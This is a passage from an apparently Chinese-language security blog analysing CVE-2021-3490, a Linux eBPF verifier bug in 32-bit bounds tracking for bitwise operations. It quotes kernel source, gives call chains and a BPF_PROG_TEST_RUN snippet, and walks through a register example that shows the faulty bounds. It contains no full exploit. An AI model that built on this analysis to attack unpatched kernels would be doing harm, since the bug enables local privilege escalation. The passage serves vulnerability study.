</span><span style="color:#c0c5ce;">						__bpf_prog_run()
</span><span style="color:#c0c5ce;">							__x86_indirect_thunk_array()
</span><span style="color:#c0c5ce;">								jit_code()
</span></pre>
<p>另外也可以通过<code>BPF_PROG_TEST_RUN</code>去触发运行已经加载的eBPF程序
<code>prog_fd</code>是<code>BPF_PROG_LOAD</code>的返回值</p>
<pre style="background-color:#2b303b;">
<span style="color:#b48ead;">char</span><span style="color:#c0c5ce;"> data_buf[</span><span style="color:#d08770;">4096</span><span style="color:#c0c5ce;">] = {};
</span><span style="color:#b48ead;">struct</span><span style="color:#c0c5ce;"> __sk_buff md = {};
</span><span style="color:#c0c5ce;">
</span><span style="color:#65737e;">// Run prog
</span><span style="color:#b48ead;">union</span><span style="color:#c0c5ce;"> bpf_attr test_run_attr = {
</span><span style="color:#c0c5ce;">  .</span><span style="color:#bf616a;">test</span><span style="color:#c0c5ce;">.</span><span style="color:#bf616a;">data_size_in </span><span style="color:#c0c5ce;">= </span><span style="color:#d08770;">1024</span><span style="color:#c0c5ce;">,
</span><span style="color:#c0c5ce;">  .</span><span style="color:#bf616a;">test</span><span style="color:#c0c5ce;">.</span><span style="color:#bf616a;">data_in </span><span style="color:#c0c5ce;">= (uint64_t)&amp;data_buf,
</span><span style="color:#c0c5ce;">  .</span><span style="color:#bf616a;">test</span><span style="color:#c0c5ce;">.</span><span style="color:#bf616a;">ctx_size_in </span><span style="color:#c0c5ce;">= sizeof(md),
</span><span style="color:#c0c5ce;">  .</span><span style="color:#bf616a;">test</span><span style="color:#c0c5ce;">.</span><span style="color:#bf616a;">ctx_in </span><span style="color:#c0c5ce;">= (uint64_t)&amp;md,
</span><span style="color:#c0c5ce;">};
</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">test_run_attr.</span><span style="color:#bf616a;">prog_type </span><span style="color:#c0c5ce;">= BPF_PROG_TEST_RUN;
</span><span style="color:#c0c5ce;">test_run_attr.</span><span style="color:#bf616a;">test</span><span style="color:#c0c5ce;">.</span><span style="color:#bf616a;">prog_fd </span><span style="color:#c0c5ce;">= prog_fd;
</span><span style="color:#b48ead;">int</span><span style="color:#c0c5ce;"> ret = </span><span style="color:#8fa1b3;">SYSCHK</span><span style="color:#c0c5ce;">(</span><span style="color:#8fa1b3;">syscall</span><span style="color:#c0c5ce;">(SYS_bpf, BPF_PROG_TEST_RUN, &amp;test_run_attr,
</span><span style="color:#c0c5ce;">					   sizeof(test_run_attr)));
</span></pre>
<p>对于<code>BPF_PROG_TYPE_SOCKET_FILTER</code>，使用<code>BPF_PROG_TEST_RUN</code>触发eBPF的调用链</p>
<pre style="background-color:#2b303b;">
<span style="color:#c0c5ce;">__sys_bpf()
</span><span style="color:#c0c5ce;">	bpf_prog_test_run()
</span><span style="color:#c0c5ce;">		bpf_prog_test_run_skb()
</span><span style="color:#c0c5ce;">			bpf_test_run()
</span><span style="color:#c0c5ce;">				bpf_prog_run()
</span><span style="color:#c0c5ce;">					__bpf_prog_run()
</span><span style="color:#c0c5ce;">						__x86_indirect_thunk_array()
</span><span style="color:#c0c5ce;">							jit_code()
</span></pre>
<h2 id="cve-2021-3490">cve-2021-3490</h2><p>CVE-2021-3490 是一个发生在 eBPF verifier 中的漏洞，由于 eBPF verifier 在校验位运算操作（ 与、或、异或 ）时没有正确地更新寄存器的 32 位边界，从而导致攻击者可以构造出非法的运行时寄存器值以进行提权；该漏洞在 这个 commit 中被引入，在 这个 commit 中被修复
下文使用内核版本 5.11.6 进行分析</p>
<h3 id="lou-dong-fen-xi">漏洞分析</h3><p>eBPF指令合法性校验通过eBPF verifier完成，核心函数为<code>do_check()</code>
对于算术指令（<code>BPF_ALU</code> / <code>BPF_ALU64</code>）调用链如下</p>
<pre style="background-color:#2b303b;">
<span style="color:#c0c5ce;">do_check()	// 遍历每一条指令并根据类型调用相应函数处理
</span><span style="color:#c0c5ce;">	check_alu_op()	// 根据算术指令的 opcode 进行不同处理
</span><span style="color:#c0c5ce;">		adjust_reg_min_max_vals()	// 计算新的寄存器边界值
</span><span style="color:#c0c5ce;">			adjust_scalar_min_max_vals()	// 根据 opcode 计算具体的新边界值
</span></pre>
<pre style="background-color:#2b303b;">
<span style="color:#65737e;">/* WARNING: 该函数在 64 位值上进行计算，但实际执行可能在 32 位值上，
</span><span style="color:#65737e;"> * 因此在 32 位的情况下，诸如位移等需要额外的检查.
</span><span style="color:#65737e;"> */
</span><span style="color:#b48ead;">static int </span><span style="color:#8fa1b3;">adjust_scalar_min_max_vals</span><span style="color:#c0c5ce;">(</span><span style="color:#b48ead;">struct</span><span style="color:#c0c5ce;"> bpf_verifier_env *</span><span style="color:#bf616a;">env</span><span style="color:#c0c5ce;">,
</span><span style="color:#c0c5ce;">				      </span><span style="color:#b48ead;">struct</span><span style="color:#c0c5ce;"> bpf_insn *</span><span style="color:#bf616a;">insn</span><span style="color:#c0c5ce;">,
</span><span style="color:#c0c5ce;">				      </span><span style="color:#b48ead;">struct</span><span style="color:#c0c5ce;"> bpf_reg_state *</span><span style="color:#bf616a;">dst_reg</span><span style="color:#c0c5ce;">,
</span><span style="color:#c0c5ce;">				      </span><span style="color:#b48ead;">struct</span><span style="color:#c0c5ce;"> bpf_reg_state </span><span style="color:#bf616a;">src_reg</span><span style="color:#c0c5ce;">)
</span><span style="color:#c0c5ce;">{
</span><span style="color:#c0c5ce;">	</span><span style="color:#65737e;">//...
</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">	</span><span style="color:#b48ead;">switch </span><span style="color:#c0c5ce;">(opcode) {
</span><span style="color:#c0c5ce;">	</span><span style="color:#65737e;">//...
</span><span style="color:#c0c5ce;">	</span><span style="color:#b48ead;">case</span><span style="color:#c0c5ce;"> BPF_AND:
</span><span style="color:#c0c5ce;">		dst_reg-&gt;var_off = </span><span style="color:#8fa1b3;">tnum_and</span><span style="color:#c0c5ce;">(dst_reg-&gt;var_off, src_reg.</span><span style="color:#bf616a;">var_off</span><span style="color:#c0c5ce;">);
</span><span style="color:#c0c5ce;">		</span><span style="color:#8fa1b3;">scalar32_min_max_and</span><span style="color:#c0c5ce;">(dst_reg, &amp;src_reg);	</span><span style="color:#65737e;">/* 漏洞点 */
</span><span style="color:#c0c5ce;">		</span><span style="color:#8fa1b3;">scalar_min_max_and</span><span style="color:#c0c5ce;">(dst_reg, &amp;src_reg);
</span><span style="color:#c0c5ce;">		</span><span style="color:#b48ead;">break</span><span style="color:#c0c5ce;">;
</span><span style="color:#c0c5ce;">	</span><span style="color:#b48ead;">case</span><span style="color:#c0c5ce;"> BPF_OR:
</span><span style="color:#c0c5ce;">		dst_reg-&gt;var_off = </span><span style="color:#8fa1b3;">tnum_or</span><span style="color:#c0c5ce;">(dst_reg-&gt;var_off, src_reg.</span><span style="color:#bf616a;">var_off</span><span style="color:#c0c5ce;">);
</span><span style="color:#c0c5ce;">		</span><span style="color:#8fa1b3;">scalar32_min_max_or</span><span style="color:#c0c5ce;">(dst_reg, &amp;src_reg);	</span><span style="color:#65737e;">/* 漏洞点 */
</span><span style="color:#c0c5ce;">		</span><span style="color:#8fa1b3;">scalar_min_max_or</span><span style="color:#c0c5ce;">(dst_reg, &amp;src_reg);
</span><span style="color:#c0c5ce;">		</span><span style="color:#b48ead;">break</span><span style="color:#c0c5ce;">;
</span><span style="color:#c0c5ce;">	</span><span style="color:#b48ead;">case</span><span style="color:#c0c5ce;"> BPF_XOR:
</span><span style="color:#c0c5ce;">		dst_reg-&gt;var_off = </span><span style="color:#8fa1b3;">tnum_xor</span><span style="color:#c0c5ce;">(dst_reg-&gt;var_off, src_reg.</span><span style="color:#bf616a;">var_off</span><span style="color:#c0c5ce;">);
</span><span style="color:#c0c5ce;">		</span><span style="color:#8fa1b3;">scalar32_min_max_xor</span><span style="color:#c0c5ce;">(dst_reg, &amp;src_reg);	</span><span style="color:#65737e;">/* 漏洞点 */
</span><span style="color:#c0c5ce;">		</span><span style="color:#8fa1b3;">scalar_min_max_xor</span><span style="color:#c0c5ce;">(dst_reg, &amp;src_reg);
</span><span style="color:#c0c5ce;">		</span><span style="color:#b48ead;">break</span><span style="color:#c0c5ce;">;
</span><span style="color:#c0c5ce;">	</span><span style="color:#65737e;">//...
</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">	</span><span style="color:#65737e;">/* ALU32 ops are zero extended into 64bit register */
</span><span style="color:#c0c5ce;">	</span><span style="color:#b48ead;">if </span><span style="color:#c0c5ce;">(alu32)
</span><span style="color:#c0c5ce;">		</span><span style="color:#8fa1b3;">zext_32_to_64</span><span style="color:#c0c5ce;">(dst_reg);
</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">	</span><span style="color:#8fa1b3;">__update_reg_bounds</span><span style="color:#c0c5ce;">(dst_reg);</span><span style="color:#65737e;">//更新边界
</span><span style="color:#c0c5ce;">	</span><span style="color:#8fa1b3;">__reg_deduce_bounds</span><span style="color:#c0c5ce;">(dst_reg);
</span><span style="color:#c0c5ce;">	</span><span style="color:#8fa1b3;">__reg_bound_offset</span><span style="color:#c0c5ce;">(dst_reg);
</span><span style="color:#c0c5ce;">	</span><span style="color:#b48ead;">return </span><span style="color:#d08770;">0</span><span style="color:#c0c5ce;">;
</span><span style="color:#c0c5ce;">}
</span></pre>
<p>更新32位边界值时 开发者认为如果两个寄存器低32位均known，则可以跳过 因为64位时还会更新</p>
<pre style="background-color:#2b303b;">
<span style="color:#b48ead;">static void </span><span style="color:#8fa1b3;">scalar32_min_max_and</span><span style="color:#c0c5ce;">(</span><span style="color:#b48ead;">struct</span><span style="color:#c0c5ce;"> bpf_reg_state *</span><span style="color:#bf616a;">dst_reg</span><span style="color:#c0c5ce;">,
</span><span style="color:#c0c5ce;">				 </span><span style="color:#b48ead;">struct</span><span style="color:#c0c5ce;"> bpf_reg_state *</span><span style="color:#bf616a;">src_reg</span><span style="color:#c0c5ce;">)
</span><span style="color:#c0c5ce;">{
</span><span style="color:#c0c5ce;">	</span><span style="color:#b48ead;">bool</span><span style="color:#c0c5ce;"> src_known = </span><span style="color:#8fa1b3;">tnum_subreg_is_const</span><span style="color:#c0c5ce;">(src_reg-&gt;var_off);
</span><span style="color:#c0c5ce;">	</span><span style="color:#b48ead;">bool</span><span style="color:#c0c5ce;"> dst_known = </span><span style="color:#8fa1b3;">tnum_subreg_is_const</span><span style="color:#c0c5ce;">(dst_reg-&gt;var_off);
</span><span style="color:#c0c5ce;">	</span><span style="color:#b48ead;">struct</span><span style="color:#c0c5ce;"> tnum var32_off = </span><span style="color:#8fa1b3;">tnum_subreg</span><span style="color:#c0c5ce;">(dst_reg-&gt;var_off);
</span><span style="color:#c0c5ce;">	s32 smin_val = src_reg-&gt;s32_min_value;
</span><span style="color:#c0c5ce;">	u32 umax_val = src_reg-&gt;u32_max_value;
</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">	</span><span style="color:#65737e;">/* Assuming scalar64_min_max_and will be called so its safe
</span><span style="color:#65737e;">	 * to skip updating register for known 32-bit case.
</span><span style="color:#65737e;">	 */
</span><span style="color:#c0c5ce;">	</span><span style="color:#b48ead;">if </span><span style="color:#c0c5ce;">(src_known &amp;&amp; dst_known)
</span><span style="color:#c0c5ce;">		</span><span style="color:#b48ead;">return</span><span style="color:#c0c5ce;">;
</span><span style="color:#c0c5ce;">	...
</span><span style="color:#c0c5ce;">}
</span></pre>
<p><code>tnum_subreg_is_const()</code>函数返回传入tnum32位mask，判断是否已知</p>
<pre style="background-color:#2b303b;">
<span style="color:#65737e;">/* Returns true if 32-bit subreg @a is a known constant*/
</span><span style="color:#b48ead;">static inline bool </span><span style="color:#8fa1b3;">tnum_subreg_is_const</span><span style="color:#c0c5ce;">(</span><span style="color:#b48ead;">struct</span><span style="color:#c0c5ce;"> tnum </span><span style="color:#bf616a;">a</span><span style="color:#c0c5ce;">)
</span><span style="color:#c0c5ce;">{
</span><span style="color:#c0c5ce;">	</span><span style="color:#b48ead;">return </span><span style="color:#c0c5ce;">!(</span><span style="color:#8fa1b3;">tnum_subreg</span><span style="color:#c0c5ce;">(a)).</span><span style="color:#bf616a;">mask</span><span style="color:#c0c5ce;">;
</span><span style="color:#c0c5ce;">}
</span><span style="color:#b48ead;">struct</span><span style="color:#c0c5ce;"> tnum </span><span style="color:#8fa1b3;">tnum_subreg</span><span style="color:#c0c5ce;">(</span><span style="color:#b48ead;">struct</span><span style="color:#c0c5ce;"> tnum </span><span style="color:#bf616a;">a</span><span style="color:#c0c5ce;">)
</span><span style="color:#c0c5ce;">{
</span><span style="color:#c0c5ce;">	</span><span style="color:#b48ead;">return </span><span style="color:#8fa1b3;">tnum_cast</span><span style="color:#c0c5ce;">(a, </span><span style="color:#d08770;">4</span><span style="color:#c0c5ce;">);
</span><span style="color:#c0c5ce;">}
</span><span style="color:#b48ead;">struct</span><span style="color:#c0c5ce;"> tnum </span><span style="color:#8fa1b3;">tnum_cast</span><span style="color:#c0c5ce;">(</span><span style="color:#b48ead;">struct</span><span style="color:#c0c5ce;"> tnum </span><span style="color:#bf616a;">a</span><span style="color:#c0c5ce;">, u8 </span><span style="color:#bf616a;">size</span><span style="color:#c0c5ce;">)
</span><span style="color:#c0c5ce;">{
</span><span style="color:#c0c5ce;">	a.</span><span style="color:#bf616a;">value </span><span style="color:#c0c5ce;">&amp;= (</span><span style="color:#d08770;">1ULL </span><span style="color:#c0c5ce;">&lt;&lt; (size * </span><span style="color:#d08770;">8</span><span style="color:#c0c5ce;">)) - </span><span style="color:#d08770;">1</span><span style="color:#c0c5ce;">;
</span><span style="color:#c0c5ce;">	a.</span><span style="color:#bf616a;">mask </span><span style="color:#c0c5ce;">&amp;= (</span><span style="color:#d08770;">1ULL </span><span style="color:#c0c5ce;">&lt;&lt; (size * </span><span style="color:#d08770;">8</span><span style="color:#c0c5ce;">)) - </span><span style="color:#d08770;">1</span><span style="color:#c0c5ce;">;
</span><span style="color:#c0c5ce;">	</span><span style="color:#b48ead;">return</span><span style="color:#c0c5ce;"> a;
</span><span style="color:#c0c5ce;">}
</span></pre>
<p>更新64位边界值时 若两个寄存器均为known 则调用<code>__mark_reg_known()</code></p>
<pre style="background-color:#2b303b;">
<span style="color:#b48ead;">static void </span><span style="color:#8fa1b3;">scalar_min_max_and</span><span style="color:#c0c5ce;">(</span><span style="color:#b48ead;">struct</span><span style="color:#c0c5ce;"> bpf_reg_state *</span><span style="color:#bf616a;">dst_reg</span><span style="color:#c0c5ce;">,
</span><span style="color:#c0c5ce;">			       </span><span style="color:#b48ead;">struct</span><span style="color:#c0c5ce;"> bpf_reg_state *</span><span style="color:#bf616a;">src_reg</span><span style="color:#c0c5ce;">)
</span><span style="color:#c0c5ce;">{
</span><span style="color:#c0c5ce;">	</span><span style="color:#b48ead;">bool</span><span style="color:#c0c5ce;"> src_known = </span><span style="color:#8fa1b3;">tnum_is_const</span><span style="color:#c0c5ce;">(src_reg-&gt;var_off);
</span><span style="color:#c0c5ce;">	</span><span style="color:#b48ead;">bool</span><span style="color:#c0c5ce;"> dst_known = </span><span style="color:#8fa1b3;">tnum_is_const</span><span style="color:#c0c5ce;">(dst_reg-&gt;var_off);
</span><span style="color:#c0c5ce;">	s64 smin_val = src_reg-&gt;smin_value;
</span><span style="color:#c0c5ce;">	u64 umax_val = src_reg-&gt;umax_value;
</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">	</span><span style="color:#b48ead;">if </span><span style="color:#c0c5ce;">(src_known &amp;&amp; dst_known) {
</span><span style="color:#c0c5ce;">		</span><span style="color:#8fa1b3;">__mark_reg_known</span><span style="color:#c0c5ce;">(dst_reg, dst_reg-&gt;var_off.</span><span style="color:#bf616a;">value</span><span style="color:#c0c5ce;">);
</span><span style="color:#c0c5ce;">		</span><span style="color:#b48ead;">return</span><span style="color:#c0c5ce;">;
</span><span style="color:#c0c5ce;">	}
</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">	...
</span><span style="color:#c0c5ce;">}
</span></pre>
<p><code>__mark_reg_known()</code>即使用<code>tnum_const()</code>设置var_off为已知
并将其边界值设置为值本身</p>
<pre style="background-color:#2b303b;">
<span style="color:#65737e;">/* This helper doesn&#39;t clear reg-&gt;id */
</span><span style="color:#b48ead;">static void </span><span style="color:#8fa1b3;">___mark_reg_known</span><span style="color:#c0c5ce;">(</span><span style="color:#b48ead;">struct</span><span style="color:#c0c5ce;"> bpf_reg_state *</span><span style="color:#bf616a;">reg</span><span style="color:#c0c5ce;">, u64 </span><span style="color:#bf616a;">imm</span><span style="color:#c0c5ce;">)
</span><span style="color:#c0c5ce;">{
</span><span style="color:#c0c5ce;">	reg-&gt;var_off = </span><span style="color:#8fa1b3;">tnum_const</span><span style="color:#c0c5ce;">(imm);
</span><span style="color:#c0c5ce;">	reg-&gt;smin_value = (s64)imm;
</span><span style="color:#c0c5ce;">	reg-&gt;smax_value = (s64)imm;
</span><span style="color:#c0c5ce;">	reg-&gt;umin_value = imm;
</span><span style="color:#c0c5ce;">	reg-&gt;umax_value = imm;
</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">	reg-&gt;s32_min_value = (s32)imm;
</span><span style="color:#c0c5ce;">	reg-&gt;s32_max_value = (s32)imm;
</span><span style="color:#c0c5ce;">	reg-&gt;u32_min_value = (u32)imm;
</span><span style="color:#c0c5ce;">	reg-&gt;u32_max_value = (u32)imm;
</span><span style="color:#c0c5ce;">}
</span><span style="color:#c0c5ce;">
</span><span style="color:#65737e;">/* Mark the unknown part of a register (variable offset or scalar value) as
</span><span style="color:#65737e;"> * known to have the value @imm.
</span><span style="color:#65737e;"> */
</span><span style="color:#b48ead;">static void </span><span style="color:#8fa1b3;">__mark_reg_known</span><span style="color:#c0c5ce;">(</span><span style="color:#b48ead;">struct</span><span style="color:#c0c5ce;"> bpf_reg_state *</span><span style="color:#bf616a;">reg</span><span style="color:#c0c5ce;">, u64 </span><span style="color:#bf616a;">imm</span><span style="color:#c0c5ce;">)
</span><span style="color:#c0c5ce;">{
</span><span style="color:#c0c5ce;">	</span><span style="color:#65737e;">/* Clear id, off, and union(map_ptr, range) */
</span><span style="color:#c0c5ce;">	</span><span style="color:#96b5b4;">memset</span><span style="color:#c0c5ce;">(((u8 *)reg) + sizeof(reg-&gt;type), </span><span style="color:#d08770;">0</span><span style="color:#c0c5ce;">,
</span><span style="color:#c0c5ce;">	       </span><span style="color:#8fa1b3;">offsetof</span><span style="color:#c0c5ce;">(</span><span style="color:#b48ead;">struct</span><span style="color:#c0c5ce;"> bpf_reg_state, var_off) - sizeof(reg-&gt;type));
</span><span style="color:#c0c5ce;">	</span><span style="color:#8fa1b3;">___mark_reg_known</span><span style="color:#c0c5ce;">(reg, imm);
</span><span style="color:#c0c5ce;">}
</span><span style="color:#b48ead;">struct</span><span style="color:#c0c5ce;"> tnum </span><span style="color:#8fa1b3;">tnum_const</span><span style="color:#c0c5ce;">(u64 </span><span style="color:#bf616a;">value</span><span style="color:#c0c5ce;">)
</span><span style="color:#c0c5ce;">{
</span><span style="color:#c0c5ce;">	</span><span style="color:#b48ead;">return </span><span style="color:#8fa1b3;">TNUM</span><span style="color:#c0c5ce;">(value, </span><span style="color:#d08770;">0</span><span style="color:#c0c5ce;">);
</span><span style="color:#c0c5ce;">}
</span></pre>
<p>问题在于如果存在一个高32位unknown、低32位known的寄存器，则不会调用<code>__mark_reg_known()</code>更新32位边界值 只会更新64位边界值</p>
<pre style="background-color:#2b303b;">
<span style="color:#b48ead;">static void </span><span style="color:#8fa1b3;">scalar_min_max_and</span><span style="color:#c0c5ce;">(</span><span style="color:#b48ead;">struct</span><span style="color:#c0c5ce;"> bpf_reg_state *</span><span style="color:#bf616a;">dst_reg</span><span style="color:#c0c5ce;">,
</span><span style="color:#c0c5ce;">			       </span><span style="color:#b48ead;">struct</span><span style="color:#c0c5ce;"> bpf_reg_state *</span><span style="color:#bf616a;">src_reg</span><span style="color:#c0c5ce;">)
</span><span style="color:#c0c5ce;">{
</span><span style="color:#c0c5ce;">	...
</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">	</span><span style="color:#65737e;">/* We get our minimum from the var_off, since that&#39;s inherently
</span><span style="color:#65737e;">	 * bitwise.  Our maximum is the minimum of the operands&#39; maxima.
</span><span style="color:#65737e;">	 */
</span><span style="color:#c0c5ce;">	dst_reg-&gt;umin_value = dst_reg-&gt;var_off.</span><span style="color:#bf616a;">value</span><span style="color:#c0c5ce;">;
</span><span style="color:#c0c5ce;">	dst_reg-&gt;umax_value = </span><span style="color:#8fa1b3;">min</span><span style="color:#c0c5ce;">(dst_reg-&gt;umax_value, umax_val);
</span><span style="color:#c0c5ce;">	</span><span style="color:#b48ead;">if </span><span style="color:#c0c5ce;">(dst_reg-&gt;smin_value &lt; </span><span style="color:#d08770;">0 </span><span style="color:#c0c5ce;">|| smin_val &lt; </span><span style="color:#d08770;">0</span><span style="color:#c0c5ce;">) {
</span><span style="color:#c0c5ce;">		</span><span style="color:#65737e;">/* Lose signed bounds when ANDing negative numbers,
</span><span style="color:#65737e;">		 * ain&#39;t nobody got time for that.
</span><span style="color:#65737e;">		 */
</span><span style="color:#c0c5ce;">		dst_reg-&gt;smin_value = S64_MIN;
</span><span style="color:#c0c5ce;">		dst_reg-&gt;smax_value = S64_MAX;
</span><span style="color:#c0c5ce;">	} </span><span style="color:#b48ead;">else </span><span style="color:#c0c5ce;">{
</span><span style="color:#c0c5ce;">		</span><span style="color:#65737e;">/* ANDing two positives gives a positive, so safe to
</span><span style="color:#65737e;">		 * cast result into s64.
</span><span style="color:#65737e;">		 */
</span><span style="color:#c0c5ce;">		dst_reg-&gt;smin_value = dst_reg-&gt;umin_value;
</span><span style="color:#c0c5ce;">		dst_reg-&gt;smax_value = dst_reg-&gt;umax_value;
</span><span style="color:#c0c5ce;">	}
</span><span style="color:#c0c5ce;">	</span><span style="color:#65737e;">/* We may learn something more from the var_off */
</span><span style="color:#c0c5ce;">	</span><span style="color:#8fa1b3;">__update_reg_bounds</span><span style="color:#c0c5ce;">(dst_reg);
</span><span style="color:#c0c5ce;">}
</span></pre>
<p>一个例子：</p>
<ul>
<li><code>R2 = { .value=0x1, .mask=0xffffffff00000000 }</code>：寄存器低32位已知为1，高32位unkown</li>
<li><code>R3 = { .value=0x100000002, .mask=0x0}</code>：寄存器64位全已知，为0x100000002
R2(dst_reg)和R3(src_reg)做与运算，则首先调用<code>tnum_and()</code>得到<code>{.value=0x0, .mask=0x100000000}</code> 仅第32位不确定</li>
</ul>
<pre style="background-color:#2b303b;">
<span style="color:#b48ead;">struct</span><span style="color:#c0c5ce;"> tnum </span><span style="color:#8fa1b3;">tnum_and</span><span style="color:#c0c5ce;">(</span><span style="color:#b48ead;">struct</span><span style="color:#c0c5ce;"> tnum </span><span style="color:#bf616a;">a</span><span style="color:#c0c5ce;">, </span><span style="color:#b48ead;">struct</span><span style="color:#c0c5ce;"> tnum </span><span style="color:#bf616a;">b</span><span style="color:#c0c5ce;">)
</span><span style="color:#c0c5ce;">{
</span><span style="color:#c0c5ce;">	u64 alpha, beta, v;
</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">	alpha = a.</span><span style="color:#bf616a;">value </span><span style="color:#c0c5ce;">| a.</span><span style="color:#bf616a;">mask</span><span style="color:#c0c5ce;">;
</span><span style="color:#c0c5ce;">	beta = b.</span><span style="color:#bf616a;">value </span><span style="color:#c0c5ce;">| b.</span><span style="color:#bf616a;">mask</span><span style="color:#c0c5ce;">;
</span><span style="color:#c0c5ce;">	v = a.</span><span style="color:#bf616a;">value </span><span style="color:#c0c5ce;">&amp; b.</span><span style="color:#bf616a;">value</span><span style="color:#c0c5ce;">;
</span><span style="color:#c0c5ce;">	</span><span style="color:#b48ead;">return </span><span style="color:#8fa1b3;">TNUM</span><span style="color:#c0c5ce;">(v, alpha &amp; beta &amp; ~v);
</span><span style="color:#c0c5ce;">}
</span></pre>
<p>接着进入<code>scalar32_min_max_and()</code>直接返回 进入<code>scalar_min_max_and()</code>
函数最终调用<code>__update_reg_bounds()</code>更新边界值</p>
<pre style="background-color:#2b303b;">
<span style="color:#b48ead;">static void </span><span style="color:#8fa1b3;">__update_reg32_bounds</span><span style="color:#c0c5ce;">(</span><span style="color:#b48ead;">struct</span><span style="color:#c0c5ce;"> bpf_reg_state *</span><span style="color:#bf616a;">reg</span><span style="color:#c0c5ce;">)
</span><span style="color:#c0c5ce;">{
</span><span style="color:#c0c5ce;">	</span><span style="color:#b48ead;">struct</span><span style="color:#c0c5ce;"> tnum var32_off = </span><span style="color:#8fa1b3;">tnum_subreg</span><span style="color:#c0c5ce;">(reg-&gt;var_off);
</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">	</span><span style="color:#65737e;">/* min signed is max(sign bit) | min(other bits) */
</span><span style="color:#c0c5ce;">	reg-&gt;s32_min_value = </span><span style="color:#8fa1b3;">max_t</span><span style="color:#c0c5ce;">(s32, reg-&gt;s32_min_value,
</span><span style="color:#c0c5ce;">			var32_off.</span><span style="color:#bf616a;">value </span><span style="color:#c0c5ce;">| (var32_off.</span><span style="color:#bf616a;">mask </span><span style="color:#c0c5ce;">&amp; S32_MIN));
</span><span style="color:#c0c5ce;">	</span><span style="color:#65737e;">/* max signed is min(sign bit) | max(other bits) */
</span><span style="color:#c0c5ce;">	reg-&gt;s32_max_value = </span><span style="color:#8fa1b3;">min_t</span><span style="color:#c0c5ce;">(s32, reg-&gt;s32_max_value,
</span><span style="color:#c0c5ce;">			var32_off.</span><span style="color:#bf616a;">value </span><span style="color:#c0c5ce;">| (var32_off.</span><span style="color:#bf616a;">mask </span><span style="color:#c0c5ce;">&amp; S32_MAX));
</span><span style="color:#c0c5ce;">	reg-&gt;u32_min_value = </span><span style="color:#8fa1b3;">max_t</span><span style="color:#c0c5ce;">(u32, reg-&gt;u32_min_value, (u32)var32_off.</span><span style="color:#bf616a;">value</span><span style="color:#c0c5ce;">);
</span><span style="color:#c0c5ce;">	reg-&gt;u32_max_value = </span><span style="color:#8fa1b3;">min</span><span style="color:#c0c5ce;">(reg-&gt;u32_max_value,
</span><span style="color:#c0c5ce;">				 (u32)(var32_off.</span><span style="color:#bf616a;">value </span><span style="color:#c0c5ce;">| var32_off.</span><span style="color:#bf616a;">mask</span><span style="color:#c0c5ce;">));
</span><span style="color:#c0c5ce;">}
</span><span style="color:#c0c5ce;">
</span><span style="color:#b48ead;">static void </span><span style="color:#8fa1b3;">__update_reg64_bounds</span><span style="color:#c0c5ce;">(</span><span style="color:#b48ead;">struct</span><span style="color:#c0c5ce;"> bpf_reg_state *</span><span style="color:#bf616a;">reg</span><span style="color:#c0c5ce;">)
</span><span style="color:#c0c5ce;">{
</span><span style="color:#c0c5ce;">	</span><span style="color:#65737e;">/* min signed is max(sign bit) | min(other bits) */
</span><span style="color:#c0c5ce;">	reg-&gt;smin_value = </span><span style="color:#8fa1b3;">max_t</span><span style="color:#c0c5ce;">(s64, reg-&gt;smin_value,
</span><span style="color:#c0c5ce;">				reg-&gt;var_off.</span><span style="color:#bf616a;">value </span><span style="color:#c0c5ce;">| (reg-&gt;var_off.</span><span style="color:#bf616a;">mask </span><span style="color:#c0c5ce;">&amp; S64_MIN));
</span><span style="color:#c0c5ce;">	</span><span style="color:#65737e;">/* max signed is min(sign bit) | max(other bits) */
</span><span style="color:#c0c5ce;">	reg-&gt;smax_value = </span><span style="color:#8fa1b3;">min_t</span><span style="color:#c0c5ce;">(s64, reg-&gt;smax_value,
</span><span style="color:#c0c5ce;">				reg-&gt;var_off.</span><span style="color:#bf616a;">value </span><span style="color:#c0c5ce;">| (reg-&gt;var_off.</span><span style="color:#bf616a;">mask </span><span style="color:#c0c5ce;">&amp; S64_MAX));
</span><span style="color:#c0c5ce;">	reg-&gt;umin_value = </span><span style="color:#8fa1b3;">max</span><span style="color:#c0c5ce;">(reg-&gt;umin_value, reg-&gt;var_off.</span><span style="color:#bf616a;">value</span><span style="color:#c0c5ce;">);
</span><span style="color:#c0c5ce;">	reg-&gt;umax_value = </span><span style="color:#8fa1b3;">min</span><span style="color:#c0c5ce;">(reg-&gt;umax_value,
</span><span style="color:#c0c5ce;">			      reg-&gt;var_off.</span><span style="color:#bf616a;">value </span><span style="color:#c0c5ce;">| reg-&gt;var_off.</span><span style="color:#bf616a;">mask</span><span style="color:#c0c5ce;">);
</span><span style="color:#c0c5ce;">}
</span><span style="color:#c0c5ce;">
</span><span style="color:#b48ead;">static void </span><span style="color:#8fa1b3;">__update_reg_bounds</span><span style="color:#c0c5ce;">(</span><span style="color:#b48ead;">struct</span><span style="color:#c0c5ce;"> bpf_reg_state *</span><span style="color:#bf616a;">reg</span><span style="color:#c0c5ce;">)
</span><span style="color:#c0c5ce;">{
</span><span style="color:#c0c5ce;">	</span><span style="color:#8fa1b3;">__update_reg32_bounds</span><span style="color:#c0c5ce;">(reg);
</span><span style="color:#c0c5ce;">	</span><span style="color:#8fa1b3;">__update_reg64_bounds</span><span style="color:#c0c5ce;">(reg);
</span><span style="color:#c0c5ce;">}
</span></pre>
<p>计算方法：</p>
<ul>
<li>最小边界值 = <code>max(min_value, var_off)</code></li>
<li>最大边界值 = <code>min(max_value, var_off)</code></li>
</ul>
<p>在构造R2寄存器的低32位 会有下面逻辑：
对于已知值的源寄存器，设置边界为其值</p>
<pre style="background-color:#2b303b;">
<span style="color:#b48ead;">else </span><span style="color:#c0c5ce;">{
</span><span style="color:#c0c5ce;">		</span><span style="color:#65737e;">/* Pretend the src is a reg with a known value, since we only
</span><span style="color:#65737e;">		 * need to be able to read from this state.
</span><span style="color:#65737e;">		 */
